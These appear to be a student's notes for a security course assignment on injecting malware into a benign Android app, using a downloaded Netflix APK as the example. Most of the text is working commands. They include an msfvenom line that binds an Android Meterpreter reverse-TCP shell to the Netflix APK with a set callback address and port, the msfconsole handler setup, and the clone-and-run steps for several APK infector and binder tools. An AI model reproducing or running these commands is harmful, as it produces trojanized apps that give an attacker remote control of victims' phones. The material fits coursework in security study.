http://gauss.ececs.uc.edu/Courses/c653/homework/assgn6.pdf

# Injecting into a benign app

https://apps.evozi.com/apk-downloader/?id=com.netflix.mediaclient


## injecting onto linux

### for installing apktool for decompiling

Linux:

    Download Linux wrapper script (Right click, Save Link As apktool)
    Download apktool-2 (find newest here)
    Rename downloaded jar to apktool.jar
    Move both files (apktool.jar & apktool) to /usr/local/bin (root needed)
    Make sure both files are executable (chmod +x)
    Try running apktool via cli

apparently we can also use something like msfvenom like

### open source tools available

from : https://secnhack.in/multiple-ways-to-embed-a-payload-in-an-original-apk-file/

`msfvenom -x com.netflix.mediaclient_35512_apps.evozi.com.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o netflix.apk`

on console

msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 192.168.1.10
set lport 4444
run

using apk binder

git clone https://github.com/kinghacker0/Apk-Binder
cd Apk-Binder/
bash apk-binder.sh

git clone https://github.com/ivam3/embed.git
cd embed/
bash set-apktool


git clone https://github.com/PushpenderIndia/apkinfector.git
cd apkinfector/
python3 infector.py

git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
bash setup.sh

git clone https://github.com/M4sc3r4n0/Evil-Droid.git
cd Evil-Droid
chmod +x evil-droid
bash evil-droid









